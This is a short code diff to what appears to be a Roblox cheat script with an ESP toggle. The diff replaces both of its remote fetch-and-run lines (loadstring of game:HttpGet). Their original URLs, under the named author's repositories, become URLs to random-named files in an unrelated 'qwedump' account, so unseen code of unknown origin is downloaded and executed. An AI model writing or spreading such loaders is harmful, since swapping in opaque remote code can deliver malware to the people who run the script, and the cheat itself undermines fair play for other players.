@@ -7,7 +7,7 @@ getgenv().luaguardvars = {
 	DiscordName = "chadrey_9",
 }
 
-local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/ChadreysOfficialScript/Uilibs/refs/heads/main/Chadz/Chadz.lib"))()
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/qwedump/A9xT7mQ2ZpL4/refs/heads/main/M8rQ1vW4eC6B"))()
 library:init()
 
 local Window = library.NewWindow({
@@ -699,7 +699,7 @@ sections.VisualSection1:AddToggle({
 	state = false,
 	callback = function(state)
 		if state then
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/ChadreysOfficialScript/Esp/refs/heads/main/Esp"))()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/qwedump/N8zV4xC1TaR5/refs/heads/main/B6rT1vZ8WpN4"))()
 		end
 	end
 })
